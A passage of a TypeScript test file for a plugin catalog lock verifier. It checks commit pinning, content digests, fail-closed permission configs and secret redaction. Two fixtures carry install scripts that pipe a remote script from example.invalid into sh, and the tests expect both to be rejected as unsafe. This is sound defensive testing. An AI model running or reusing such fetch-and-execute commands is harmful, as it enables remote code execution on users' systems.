    const subdirectoryCandidate = fixtureCatalog.candidates.find(candidate =>
      candidate.expectedPackage === SUBDIRECTORY_FIXTURE_PACKAGE)
    if (subdirectoryCandidate === undefined) throw new Error('missing subdirectory fixture candidate')
    writeFileSync(join(externalPackageDir, '.dsh-curated-artifact.json'), JSON.stringify({
      repository,
      commit,
      sourceContentSha256: subdirectoryCandidate.sourceContentSha256,
      changedPaths: [],
    }))
    rmSync(installedPackageDir, { recursive: true, force: true })
    await assertObservedCommandsReject(
      'dsh-web-search-pro selected dependency is not installed in the managed profile',
      externalRoot,
    )
    const standaloneCatalogPath = join(home, 'standalone-catalog.json')
    writeFileSync(standaloneCatalogPath, JSON.stringify({
      ...fixtureCatalog,
      candidates: fixtureCatalog.candidates.filter(candidate =>
        candidate.expectedPackage === SUBDIRECTORY_FIXTURE_PACKAGE),
    }))
    expect(JSON.parse(commands.runVerifyLock([
      '--fixture',
      standaloneCatalogPath,
      '--artifact-root',
      externalRoot,
      '--json',
    ]).stdout)).toMatchObject({
      ok: true,
      observed: false,
      provenanceScope: 'catalog-metadata',
      selectedCandidateCount: 0,
      issues: [],
    })
    rmSync(home, { recursive: true, force: true })
  }, 50_000)

  it('keeps an unmanaged explicit artifact root metadata-only', () => {
    const catalogPath = tempFile('catalog.json', artifactCatalog())
    const artifactRoot = stageCandidateArtifact('plugin-a')
    try {
      const result = runVerifyLockCommand([
        '--fixture',
        catalogPath,
        '--artifact-root',
        artifactRoot,
        '--json',
      ])

      expect(result.status).toBe(0)
      expect(JSON.parse(result.stdout)).toMatchObject({
        command: 'verify-lock',
        ok: true,
        observed: false,
        provenanceScope: 'catalog-metadata',
        catalogCandidateCount: 1,
        selectedCandidateCount: 0,
      })
    } finally {
      cleanup(catalogPath)
      rmSync(artifactRoot, { recursive: true, force: true })
    }
  })

  it('labels metadata-only verification as non-observed', () => {
    const result = runVerifyLock(['--json'])

    expect(result.status).toBe(0)
    expect(JSON.parse(result.stdout)).toMatchObject({
      command: 'verify-lock',
      ok: true,
      observed: false,
    })
  })

  it('verifies an exact local artifact without loading code or running scripts', async () => {
    const catalogPath = tempFile('catalog.json', artifactCatalog())
    const artifactRoot = stageCandidateArtifact('plugin-a', {
      scripts: { prepare: 'node ./prepare.mjs' },
    })
    const marker = join(artifactRoot, 'prepare-ran')
    writeFileSync(join(artifactRoot, 'node_modules', 'plugin-a', 'prepare.mjs'), [
      'import { writeFileSync } from \'node:fs\'',
      `writeFileSync(${JSON.stringify(marker)}, 'ran')`,
      '',
    ].join('\n'))
    const globalState = globalThis as typeof globalThis & { __dshCuratedArtifactLoads?: number }
    try {
      delete globalState.__dshCuratedArtifactLoads
      const result = runVerifyLock(['--fixture', catalogPath, '--json'], {
        artifactRoots: [artifactRoot],
        artifactResolver: fixtureArtifactResolver([artifactRoot]),
      })

      expect(result.status).toBe(1)
      const payload = JSON.parse(result.stdout) as { issues: Array<{ code: string; target?: string }> }
      expect(payload.issues).toContainEqual(expect.objectContaining({
        code: 'artifact-install-scripts-mismatch',
        target: 'plugin-a',
      }))
      expect(globalState.__dshCuratedArtifactLoads).toBeUndefined()
      expect(() => readFileSync(marker)).toThrow()
    } finally {
      delete globalState.__dshCuratedArtifactLoads
      cleanup(catalogPath)
      rmSync(artifactRoot, { recursive: true, force: true })
    }
  })

  it.each([
    {
      patch: `- insert:
    - id: permission-rules
      name: dsh-permission-rules
      config:
        badFilePolicy: ignore-with-warning
        enforce: true
`,
      code: 'artifact-permission-bad-file-policy',
    },
    {
      patch: `- insert:
    - id: permission-rules
      name: dsh-permission-rules
      config:
        badFilePolicy: fail
        enforce: false
`,
      code: 'artifact-permission-enforcement-disabled',
    },
  ])('rejects permission plugin artifact config that does not fail closed', async ({ patch, code }) => {
    const catalogPath = tempFile('catalog.json', artifactCatalog({
      id: 'dsh-permission-rules',
      capability: 'permission-policy',
      expectedPackage: 'dsh-permission-rules',
      resources: {
        entryIds: ['permission-rules'],
        waterfallListeners: ['tools/pre-execute:next'],
      },
    }))
    const artifactRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-permission-artifact-'))
    stageCandidatePackage(artifactRoot, 'dsh-permission-rules', patch)
    try {
      const result = runVerifyLock(['--fixture', catalogPath, '--json'], {
        artifactRoots: [artifactRoot],
        artifactResolver: fixtureArtifactResolver([artifactRoot]),
      })

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        issues: [{ code, target: 'dsh-permission-rules' }],
      })
    } finally {
      cleanup(catalogPath)
      rmSync(artifactRoot, { recursive: true, force: true })
    }
  })

  it('accepts fail-closed configuration from the real permission plugin artifact format', () => {
    const catalogPath = tempFile('catalog.json', artifactCatalog({
      id: 'dsh-permission-rules',
      capability: 'permission-policy',
      expectedPackage: 'dsh-permission-rules',
      resources: {
        entryIds: ['permission-rules'],
        waterfallListeners: ['tools/pre-execute:next'],
      },
    }))
    const artifactRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-permission-artifact-'))
    stageCandidatePackage(artifactRoot, 'dsh-permission-rules', `- insert:
    - id: permission-rules
      name: dsh-permission-rules
      config:
        badFilePolicy: fail
        enforce: true
`)
    try {
      const result = runVerifyLock(['--fixture', catalogPath, '--json'], {
        artifactRoots: [artifactRoot],
        artifactResolver: fixtureArtifactResolver([artifactRoot]),
      })

      expect(result.status).toBe(0)
    } finally {
      cleanup(catalogPath)
      rmSync(artifactRoot, { recursive: true, force: true })
    }
  })

  it.each([
    {
      name: 'disabled permission row',
      entryIds: ['permission-rules'],
      patch: `- insert:
    - id: permission-rules
      name: dsh-permission-rules
      disabled: true
      config:
        badFilePolicy: fail
        enforce: true
`,
    },
    {
      name: 'conditional permission row',
      entryIds: ['permission-rules'],
      patch: `- insert:
    - id: permission-rules
      name: dsh-permission-rules
      disabled: !!js process.version.length === 0
      config:
        badFilePolicy: fail
        enforce: true
`,
    },
    {
      name: 'non-boolean permission row',
      entryIds: ['permission-rules'],
      patch: `- insert:
    - id: permission-rules
      name: dsh-permission-rules
      disabled: enabled
      config:
        badFilePolicy: fail
        enforce: true
`,
    },
    {
      name: 'disabled ancestor group',
      entryIds: ['permission-outer', 'permission-inner', 'permission-rules'],
      patch: `- insert:
    - id: permission-outer
      name: '@deepseek-ai/cordis-plugin-group'
      group: enabled
      disabled: false
      config:
        - id: permission-inner
          name: '@deepseek-ai/cordis-plugin-group'
          group: enabled
          disabled: true
          config:
            - id: permission-rules
              name: dsh-permission-rules
              disabled: false
              config:
                badFilePolicy: fail
                enforce: true
`,
    },
    {
      name: 'conditional ancestor group',
      entryIds: ['permission-group', 'permission-rules'],
      patch: `- insert:
    - id: permission-group
      name: '@deepseek-ai/cordis-plugin-group'
      group: enabled
      disabled: !!js process.version.length === 0
      config:
        - id: permission-rules
          name: dsh-permission-rules
          config:
            badFilePolicy: fail
            enforce: true
`,
    },
  ].map(testCase => ({ expectedCode: 'artifact-permission-entry-disabled', ...testCase })))(
    'rejects a $name that cannot prove installed permission enforcement',
    ({ entryIds, expectedCode, patch }) => {
      const catalogPath = tempFile('catalog.json', artifactCatalog({
        id: 'dsh-permission-rules',
        capability: 'permission-policy',
        expectedPackage: 'dsh-permission-rules',
        resources: {
          entryIds,
          waterfallListeners: ['tools/pre-execute:next'],
        },
      }))
      const artifactRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-permission-enabled-'))
      stageCandidatePackage(artifactRoot, 'dsh-permission-rules', patch)
      try {
        const result = runVerifyLock(['--fixture', catalogPath, '--json'], {
          artifactRoots: [artifactRoot],
          artifactResolver: fixtureArtifactResolver([artifactRoot]),
        })

        expect(result.status).toBe(1)
        expect(JSON.parse(result.stdout)).toMatchObject({
          issues: [{
            code: expectedCode,
            ...expectedCode === 'artifact-permission-entry-disabled'
              ? { target: 'dsh-permission-rules' }
              : {},
          }],
        })
      } finally {
        cleanup(catalogPath)
        rmSync(artifactRoot, { recursive: true, force: true })
      }
    },
  )

  it('accepts an installed permission row under unconditionally enabled nested groups', () => {
    const patch = `- insert:
    - id: permission-outer
      name: '@deepseek-ai/cordis-plugin-group'
      group: enabled
      disabled: false
      config:
        - id: permission-inner
          name: '@deepseek-ai/cordis-plugin-group'
          group: enabled
          config:
            - id: permission-rules
              name: dsh-permission-rules
              disabled: false
              config:
                badFilePolicy: fail
                enforce: true
`
    const catalogPath = tempFile('catalog.json', artifactCatalog({
      id: 'dsh-permission-rules',
      capability: 'permission-policy',
      expectedPackage: 'dsh-permission-rules',
      resources: {
        entryIds: ['permission-outer', 'permission-inner', 'permission-rules'],
        waterfallListeners: ['tools/pre-execute:next'],
      },
    }))
    const artifactRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-permission-enabled-'))
    stageCandidatePackage(artifactRoot, 'dsh-permission-rules', patch)
    try {
      const result = runVerifyLock(['--fixture', catalogPath, '--json'], {
        artifactRoots: [artifactRoot],
        artifactResolver: fixtureArtifactResolver([artifactRoot]),
      })

      expect(result.status, result.stdout).toBe(0)
    } finally {
      cleanup(catalogPath)
      rmSync(artifactRoot, { recursive: true, force: true })
    }
  })

  it.each([
    {
      name: 'name-mismatched safe override',
      entryIds: ['permission-rules'],
      topLevelCount: 1,
      patch: `- insert:
    - id: permission-rules
      name: ./plugin.mjs
      config:
        badFilePolicy: ignore-with-warning
        enforce: false
- id: permission-rules
  name: dsh-permission-rules
  config:
    badFilePolicy: fail
    enforce: true
`,
      expectedCodes: [
        'artifact-permission-bad-file-policy',
        'artifact-permission-enforcement-disabled',
      ],
    },
    {
      name: 'duplicate effective permission rows',
      entryIds: ['permission-rules', 'permission-rules'],
      topLevelCount: 2,
      patch: `- insert:
    - id: permission-rules
      name: dsh-permission-rules
      config:
        badFilePolicy: fail
        enforce: true
    - id: permission-rules
      name: dsh-permission-rules
      config:
        badFilePolicy: fail
        enforce: true
`,
      expectedCodes: ['artifact-permission-config-malformed'],
    },
    {
      name: 'nested unsafe permission row',
      entryIds: ['permission-group', 'permission-rules'],
      topLevelCount: 1,
      patch: `- insert:
    - id: permission-group
      name: '@deepseek-ai/cordis-plugin-group'
      group: enabled
      config:
        - id: permission-rules
          name: dsh-permission-rules
          config:
            badFilePolicy: ignore-with-warning
            enforce: false
`,
      expectedCodes: [
        'artifact-permission-bad-file-policy',
        'artifact-permission-enforcement-disabled',
      ],
    },
  ] as const)('validates permission safety from Loader-composed $name entries', ({
    entryIds,
    topLevelCount,
    patch,
    expectedCodes,
  }) => {
    const catalogPath = tempFile('catalog.json', artifactCatalog({
      id: 'dsh-permission-rules',
      capability: 'permission-policy',
      expectedPackage: 'dsh-permission-rules',
      resources: {
        entryIds,
        waterfallListeners: ['tools/pre-execute:next'],
      },
    }))
    const artifactRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-permission-composition-'))
    stageCandidatePackage(artifactRoot, 'dsh-permission-rules', patch)
    try {
      const parsed = loadYaml(patch) as Parameters<typeof composeEntries>[0][number]
      const effective = composeEntries([parsed])
      expect(effective).toHaveLength(topLevelCount)
      if (topLevelCount === 1 && entryIds[0] === 'permission-rules') {
        expect(effective[0]).toMatchObject({
          id: 'permission-rules',
          name: './plugin.mjs',
          config: {
            badFilePolicy: 'ignore-with-warning',
            enforce: false,
          },
        })
      }

      const result = runVerifyLock(['--fixture', catalogPath, '--artifact-root', artifactRoot, '--json'])
      const payload = JSON.parse(result.stdout) as { issues: Array<{ code: string }> }

      expect(result.status).toBe(1)
      expect(payload.issues.map(issue => issue.code))
        .toEqual(expect.arrayContaining([...expectedCodes]))
    } finally {
      cleanup(catalogPath)
      rmSync(artifactRoot, { recursive: true, force: true })
    }
  })

  it.each([
    {
      name: 'an unreachable package',
      expectedCode: 'artifact-unreachable',
      setup: () => mkdtempSync(join(tmpdir(), 'dsh-curated-artifact-missing-')),
    },
    {
      name: 'a different commit',
      expectedCode: 'artifact-commit-mismatch',
      setup: () => {
        const root = stageCandidateArtifact('plugin-a')
        writeFileSync(join(root, 'node_modules', 'plugin-a', '.dsh-curated-artifact.json'), JSON.stringify({
          repository: 'https://github.com/example/plugin-a',
          commit: fixtureCommitC,
          sourceContentSha256: fixtureShaA,
          changedPaths: [],
        }))
        return root
      },
    },
    {
      name: 'a different source content digest',
      expectedCode: 'artifact-source-content-sha-mismatch',
      setup: () => {
        const root = stageCandidateArtifact('plugin-a')
        writeFileSync(join(root, 'node_modules', 'plugin-a', '.dsh-curated-artifact.json'), JSON.stringify({
          repository: 'https://github.com/example/plugin-a',
          commit: fixtureCommitB,
          sourceContentSha256: fixtureShaB,
          changedPaths: [],
        }))
        return root
      },
    },
    {
      name: 'a different package name',
      expectedCode: 'artifact-package-name-mismatch',
      setup: () => stageCandidateArtifact('plugin-a', { name: 'other-package' }),
    },
    {
      name: 'a different license',
      expectedCode: 'artifact-license-mismatch',
      setup: () => stageCandidateArtifact('plugin-a', { license: 'Apache-2.0' }),
    },
    {
      name: 'a different dependency set',
      expectedCode: 'artifact-dependencies-mismatch',
      setup: () => stageCandidateArtifact('plugin-a', { dependencies: { zod: '^4.0.0' } }),
    },
    {
      name: 'a missing bundle patch',
      expectedCode: 'artifact-bundle-patch-missing',
      setup: () => {
        const root = stageCandidateArtifact('plugin-a')
        unlinkSync(join(root, 'node_modules', 'plugin-a', 'cordis.patch.yml'))
        return root
      },
    },
    {
      name: 'an incompatible Node range',
      expectedCode: 'artifact-node-incompatible',
      setup: () => stageCandidateArtifact('plugin-a', { engines: { node: '>=99' } }),
    },
    {
      name: 'a core modification',
      expectedCode: 'artifact-core-modification',
      setup: () => {
        const root = stageCandidateArtifact('plugin-a')
        writeFileSync(join(root, 'node_modules', 'plugin-a', '.dsh-curated-artifact.json'), JSON.stringify({
          repository: 'https://github.com/example/plugin-a',
          commit: fixtureCommitB,
          sourceContentSha256: fixtureShaA,
          changedPaths: ['packages/core/agent-loop/src/index.ts'],
        }))
        return root
      },
    },
  ])('rejects $name from the artifact resolver', async ({ expectedCode, setup }) => {
    const catalogPath = tempFile('catalog.json', artifactCatalog())
    const artifactRoot = setup()
    try {
      const result = runVerifyLock(['--fixture', catalogPath, '--json'], {
        artifactRoots: [artifactRoot],
        artifactResolver: fixtureArtifactResolver([artifactRoot]),
      })
      const payload = JSON.parse(result.stdout) as { issues: Array<{ code: string; target?: string }> }

      expect(result.status).toBe(1)
      expect(payload.issues).toContainEqual(expect.objectContaining({
        code: expectedCode,
        target: 'plugin-a',
      }))
    } finally {
      cleanup(catalogPath)
      rmSync(artifactRoot, { recursive: true, force: true })
    }
  })

  it('accepts the checked-in allowlist with deterministic text output', () => {
    const result = runVerifyLock([])

    expect(result.status).toBe(0)
    expect(result.stderr).toBe('')
    expect(result.stdout).toMatch(/^verify-lock: ok \(\d+ catalog candidates\)\n$/u)
  })

  it('emits deterministic JSON for a valid fixture', () => {
    const path = tempFile('catalog.yaml', catalog(''))
    try {
      const result = runVerifyLock(['--fixture', path, '--json'])

      expect(result.status).toBe(0)
      expect(JSON.parse(result.stdout)).toEqual({
        command: 'verify-lock',
        ok: true,
        observed: false,
        provenanceScope: 'catalog-metadata',
        catalogCandidateCount: 1,
        selectedCandidateCount: 0,
        issues: [],
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects floating sources, missing audit fields, and missing source content SHA without leaking secrets', () => {
    const path = tempFile('catalog.yaml', catalog(`    resources:
      envVars: [PLUGIN_A_TOKEN]
    config:
      entryId: plugin-a
      values:
        apiKey: sk-test-secret-value
  - id: plugin-b
    priority: P1
    capability: memory
    score: 88
    scoreDimensions: *fixtureScoreDimensions
    repository: https://github.com/example/plugin-b
    repositoryPath: null
    commit: latest
    sourceStatus: verified
    auditedAt: "2026-08-25"
    manifestPath: null
    expectedPackage: null
    nodeEngine: null
    nodeEngineEvidence: null
    requiresCorePatch: false
    license: null
    bundlePatch: null
    testFiles: 0
    ciWorkflows: 0
    installScripts: {}
    externalDependencies: []
    networkAccess: []
    credentials: []
    targetProfiles: [web-curated]
    active: true
    auditWarnings: []
    rejections: []
    runtimeActivationEvidence:
      web-curated: *fixtureRuntimeActivationEvidenceSet
`))
    try {
      const result = runVerifyLock(['--fixture', path])

      expect(result.status).toBe(1)
      expect(result.stdout).toContain('candidate-commit-unpinned plugin-b')
      expect(result.stdout).toContain('candidate-license-missing plugin-b')
      expect(result.stdout).toContain('candidate-package-missing plugin-b')
      expect(result.stdout).toContain('candidate-bundle-patch-missing plugin-b')
      expect(result.stdout).toContain('candidate-source-content-sha-missing plugin-b')
      expect(result.stdout).not.toContain('sk-test-secret-value')
      expect(result.stdout).not.toContain('PLUGIN_A_TOKEN')
    } finally {
      cleanup(path)
    }
  })

  it('runs through the source-tree wrapper without a prior build', () => {
    const result = runNode('verify-lock.mjs', ['--json'])

    expect(result.status).toBe(0)
    expect(JSON.parse(result.stdout)).toMatchObject({
      command: 'verify-lock',
      ok: true,
    })
  })

  it('reports input failures as JSON without leaking fixture secrets', () => {
    const result = runVerifyLock(['--fixture=/definitely/missing/sk-verify-secret/catalog.yaml', '--json'])

    expect(result.status).toBe(1)
    expect(JSON.parse(result.stdout)).toMatchObject({
      command: 'verify-lock',
      ok: false,
      issues: [{ code: 'verify-lock-input-invalid' }],
    })
    expect(result.stdout).toContain('[REDACTED]')
    expect(result.stdout).not.toContain('sk-verify-secret')
  })

  it('accepts normalized source content SHA declarations', () => {
    const path = tempFile('catalog.yaml', catalog(`  - id: plugin-b
    priority: P1
    capability: memory
    score: 88
    scoreDimensions: *fixtureScoreDimensions
    repository: https://github.com/example/plugin-b
    repositoryPath: null
    commit: "${fixtureCommitC}"
    sourceStatus: verified
    auditedAt: "2026-08-25"
    manifestPath: package.json
    expectedPackage: plugin-b
    nodeEngine: ">=22"
    nodeEngineEvidence: package.json#engines.node
    requiresCorePatch: false
    license: MIT
    bundlePatch: ./cordis.patch.yml
    sourceContentSha256: "${fixtureShaB}"
    treeSha256: "${fixtureShaB}"
    runtimeDependencyClosureSha256: "${emptyRuntimeDependencyClosureSha}"
    testFiles: 1
    ciWorkflows: 1
    installScripts: {}
    externalDependencies: []
    networkAccess: []
    credentials: []
    targetProfiles: [web-research]
    active: true
    auditWarnings: []
    rejections: []
    runtimeActivationEvidence:
      web-research: *fixtureRuntimeActivationEvidenceSet
`))
    try {
      const result = runVerifyLock(['--fixture', path, '--json'])

      expect(result.status).toBe(0)
      expect(JSON.parse(result.stdout)).toMatchObject({
        command: 'verify-lock',
        ok: true,
        provenanceScope: 'catalog-metadata',
        catalogCandidateCount: 2,
        selectedCandidateCount: 0,
        issues: [],
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects active candidates with invalid source content SHA declarations', () => {
    const path = tempFile('catalog.yaml', catalog(`  - id: plugin-b
    priority: P1
    capability: memory
    score: 88
    scoreDimensions: *fixtureScoreDimensions
    repository: https://github.com/example/plugin-b
    repositoryPath: null
    commit: "${fixtureCommitC}"
    sourceStatus: verified
    auditedAt: "2026-08-25"
    manifestPath: package.json
    expectedPackage: plugin-b
    nodeEngine: ">=22"
    nodeEngineEvidence: package.json#engines.node
    requiresCorePatch: false
    license: MIT
    bundlePatch: ./cordis.patch.yml
    sourceContentSha256: not-a-sha
    treeSha256: "${fixtureShaB}"
    runtimeDependencyClosureSha256: "${emptyRuntimeDependencyClosureSha}"
    testFiles: 1
    ciWorkflows: 1
    installScripts: {}
    externalDependencies: []
    networkAccess: []
    credentials: []
    targetProfiles: [web-research]
    active: true
    auditWarnings: []
    rejections: []
    runtimeActivationEvidence:
      web-research: *fixtureRuntimeActivationEvidenceSet
`))
    try {
      const result = runVerifyLock(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        command: 'verify-lock',
        ok: false,
        issues: [{ code: 'candidate-source-content-sha-invalid', target: 'plugin-b' }],
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects active candidates with no source content digest', () => {
    const path = tempFile('catalog.yaml', catalog(`  - id: plugin-b
    priority: P1
    capability: memory
    score: 88
    scoreDimensions: *fixtureScoreDimensions
    repository: https://github.com/example/plugin-b
    repositoryPath: null
    commit: "${fixtureCommitC}"
    sourceStatus: verified
    auditedAt: "2026-08-25"
    manifestPath: package.json
    expectedPackage: plugin-b
    nodeEngine: ">=22"
    nodeEngineEvidence: package.json#engines.node
    requiresCorePatch: false
    license: MIT
    bundlePatch: ./cordis.patch.yml
    treeSha256: "${fixtureShaB}"
    runtimeDependencyClosureSha256: "${emptyRuntimeDependencyClosureSha}"
    testFiles: 1
    ciWorkflows: 1
    installScripts: {}
    externalDependencies: []
    networkAccess: []
    credentials: []
    targetProfiles: [web-research]
    active: true
    auditWarnings: []
    rejections: []
    runtimeActivationEvidence:
      web-research: *fixtureRuntimeActivationEvidenceSet
`))
    try {
      const result = runVerifyLock(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        command: 'verify-lock',
        ok: false,
        issues: [{ code: 'candidate-source-content-sha-missing', target: 'plugin-b' }],
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects placeholder commit and source content SHA declarations', () => {
    const path = tempFile('catalog.yaml', catalog('', {
      sourceCommit: 'a1'.repeat(20),
      candidateCommit: 'd1'.repeat(20),
      sourceContentSha256: 'e'.repeat(64),
    }))
    try {
      const result = runVerifyLock(['--fixture', path, '--json'])
      const payload = JSON.parse(result.stdout) as { issues: Array<{ code: string; target?: string; message: string }> }

      expect(result.status).toBe(1)
      expect(payload.issues).toEqual([
        {
          code: 'candidate-commit-placeholder',
          target: 'plugin-a',
          message: 'candidate commit must not be a placeholder digest',
        },
        {
          code: 'candidate-source-content-sha-placeholder',
          target: 'plugin-a',
          message: 'candidate source content SHA-256 digest must not be a placeholder digest',
        },
        {
          code: 'source-commit-placeholder',
          message: 'curated catalog source commit must not be a placeholder digest',
        },
      ])
    } finally {
      cleanup(path)
    }
  })

  it('reports omitted admission scores as lock issues', () => {
    const parsed = JSON.parse(artifactCatalog()) as { candidates: Record<string, unknown>[] }
    delete parsed.candidates[0]?.score
    const path = tempFile('catalog.json', JSON.stringify(parsed))
    try {
      const result = runVerifyLock(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        issues: [{
          code: 'candidate-score-missing',
          target: 'plugin-a',
          message: 'active candidate must declare a static admission score',
        }],
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects active candidates with scores below the scenario admission tier', () => {
    const path = tempFile('catalog.yaml', catalog(`  - id: plugin-c
    priority: P1
    capability: browser-computer-use
    score: 64
    scoreDimensions:
      nativeCompatibility: 14
      functionalCompleteness: 10
      testAndCi: 10
      securityAndPrivacy: 10
      maintenanceHealth: 6
      performanceCost: 6
      operability: 5
      communitySignal: 3
    repository: https://github.com/example/plugin-c
    repositoryPath: null
    commit: "76543210fedcba9876543210fedcba9876543210"
    sourceStatus: verified
    auditedAt: "2026-08-25"
    manifestPath: package.json
    expectedPackage: plugin-c
    nodeEngine: ">=22"
    nodeEngineEvidence: package.json#engines.node
    requiresCorePatch: false
    license: MIT
    bundlePatch: ./cordis.patch.yml
    sourceContentSha256: "${fixtureShaC}"
    treeSha256: "${fixtureShaB}"
    runtimeDependencyClosureSha256: "${emptyRuntimeDependencyClosureSha}"
    testFiles: 1
    ciWorkflows: 1
    installScripts: {}
    externalDependencies: []
    networkAccess: []
    credentials: []
    targetProfiles: [web-coding]
    active: true
    auditWarnings: []
    rejections: []
    runtimeActivationEvidence:
      web-coding: *fixtureRuntimeActivationEvidenceSet
`))
    try {
      const result = runVerifyLock(['--fixture', path, '--json'])
      const payload = JSON.parse(result.stdout) as { issues: Array<{ code: string; target?: string }> }

      expect(result.status).toBe(1)
      expect(payload.issues).toEqual([
        {
          code: 'candidate-active-score-too-low',
          target: 'plugin-c',
          message: 'active candidate admission score must qualify for a default or scenario profile',
          details: { admission: 'rejected', score: 64 },
        },
        { code: 'candidate-score-too-low', target: 'plugin-c', message: 'active candidate score must reach the scenario admission tier' },
      ])
    } finally {
      cleanup(path)
    }
  })

  it('preserves profile conflict details in JSON output', () => {
    const path = tempFile('catalog.yaml', catalog(`  - id: plugin-b
    priority: P1
    capability: web-search
    score: 88
    scoreDimensions: *fixtureScoreDimensions
    repository: https://github.com/example/plugin-b
    repositoryPath: null
    commit: "${fixtureCommitC}"
    sourceStatus: verified
    auditedAt: "2026-08-25"
    manifestPath: package.json
    expectedPackage: plugin-b
    nodeEngine: ">=22"
    nodeEngineEvidence: package.json#engines.node
    requiresCorePatch: false
    license: MIT
    bundlePatch: ./cordis.patch.yml
    sourceContentSha256: "${fixtureShaB}"
    treeSha256: "${fixtureShaB}"
    runtimeDependencyClosureSha256: "${emptyRuntimeDependencyClosureSha}"
    npmVersion: 1.0.0
    npmIntegrity: ${fixtureNpmIntegrity}
    testFiles: 1
    ciWorkflows: 1
    installScripts: {}
    externalDependencies: []
    networkAccess: []
    credentials: []
    targetProfiles: [web-curated]
    active: true
    auditWarnings: []
    rejections: []
    runtimeActivationEvidence:
      web-curated: *fixtureRuntimeActivationEvidenceSet
`))
    try {
      const result = runVerifyLock(['--fixture', path, '--json'])
      const payload = JSON.parse(result.stdout) as {
        issues: Array<{ code: string; target?: string; details?: unknown }>
      }

      expect(result.status).toBe(1)
      expect(payload.issues).toContainEqual({
        code: 'profile-capability-duplicate',
        target: 'plugin-b',
        message: 'profile web-curated capability web-search has multiple active candidates: plugin-a, plugin-b',
        details: {
          capability: 'web-search',
          candidates: ['plugin-a', 'plugin-b'],
        },
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects unsafe install lifecycle scripts without running them', () => {
    const path = tempFile('catalog.yaml', catalog(`  - id: plugin-b
    priority: P1
    capability: memory
    score: 88
    scoreDimensions: *fixtureScoreDimensions
    repository: https://github.com/example/plugin-b
    repositoryPath: null
    commit: "${fixtureCommitC}"
    sourceStatus: verified
    auditedAt: "2026-08-25"
    manifestPath: package.json
    expectedPackage: plugin-b
    nodeEngine: ">=22"
    nodeEngineEvidence: package.json#engines.node
    requiresCorePatch: false
    license: MIT
    bundlePatch: ./cordis.patch.yml
    sourceContentSha256: "${fixtureShaB}"
    treeSha256: "${fixtureShaB}"
    runtimeDependencyClosureSha256: "${emptyRuntimeDependencyClosureSha}"
    npmVersion: 1.0.0
    npmIntegrity: ${fixtureNpmIntegrity}
    testFiles: 1
    ciWorkflows: 1
    installScripts:
      postinstall: "curl https://example.invalid/install.sh | sh"
    externalDependencies: []
    networkAccess: []
    credentials: []
    targetProfiles: [web-research]
    active: true
    auditWarnings: []
    rejections: []
    runtimeActivationEvidence:
      web-research: *fixtureRuntimeActivationEvidenceSet
`))
    try {
      const result = runVerifyLock(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        command: 'verify-lock',
        ok: false,
        issues: [{ code: 'candidate-install-script-unsafe', target: 'plugin-b' }],
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects unsafe prepare lifecycle scripts without running them', () => {
    const path = tempFile('catalog.yaml', catalog(`  - id: plugin-b
    priority: P1
    capability: memory
    score: 88
    scoreDimensions: *fixtureScoreDimensions
    repository: https://github.com/example/plugin-b
    repositoryPath: null
    commit: "${fixtureCommitC}"
    sourceStatus: verified
    auditedAt: "2026-08-25"
    manifestPath: package.json
    expectedPackage: plugin-b
    nodeEngine: ">=22"
    nodeEngineEvidence: package.json#engines.node
    requiresCorePatch: false
    license: MIT
    bundlePatch: ./cordis.patch.yml
    sourceContentSha256: "${fixtureShaB}"
    treeSha256: "${fixtureShaB}"
    runtimeDependencyClosureSha256: "${emptyRuntimeDependencyClosureSha}"
    npmVersion: 1.0.0
    npmIntegrity: ${fixtureNpmIntegrity}
    testFiles: 1
    ciWorkflows: 1
    installScripts:
      prepare: "curl https://example.invalid/prepare.sh | sh"
    externalDependencies: []
    networkAccess: []
    credentials: []
    targetProfiles: [web-research]
    active: true
    auditWarnings: []
    rejections: []
    runtimeActivationEvidence:
      web-research: *fixtureRuntimeActivationEvidenceSet
`))
    try {
      const result = runVerifyLock(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        command: 'verify-lock',
        ok: false,
        issues: [{ code: 'candidate-install-script-unsafe', target: 'plugin-b' }],
      })
    } finally {
      cleanup(path)
    }
  })

  it('redacts non-Error failures thrown while loading a catalog', async () => {
    const path = tempFile('catalog.yaml', '')
    vi.resetModules()
    vi.doMock('node:fs', async () => {
      const actual = await vi.importActual<typeof import('node:fs')>('node:fs')
      return {
        ...actual,
        openSync: ((file: Parameters<typeof actual.openSync>[0], flags: number) => {
          if (file === path) throw 'sk-non-error-secret'
          return actual.openSync(file, flags)
        }) as typeof actual.openSync,
      }
    })
    try {
      const commands = await import('../src/index.ts')
      const result = commands.runVerifyLock(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(result.stdout).toContain('[REDACTED]')
      expect(result.stdout).not.toContain('sk-non-error-secret')
    } finally {
      cleanup(path)
    }
  })

  it('requires exact roots when an artifact resolver is injected', () => {
    const result = runVerifyLock(['--json'], {
      artifactResolver: { resolve: () => undefined },
    })

    expect(result.status).toBe(1)
    expect(JSON.parse(result.stdout)).toMatchObject({
      issues: [{ message: 'artifactRoots must identify the exact roots used by artifactResolver' }],
    })
  })

  it('ignores package-authored provenance outside a managed profile', () => {
    const root = mkdtempSync(join(tmpdir(), 'dsh-curated-resolver-'))
    const resolver = createInstalledArtifactResolver([root])
    const candidate = artifactCandidate()
    try {
      expect(resolver.resolve({ ...candidate, expectedPackage: null })).toBeUndefined()
      expect(resolver.resolve(candidate)).toBeUndefined()

      const packageDir = stageCandidatePackage(root, 'plugin-a')
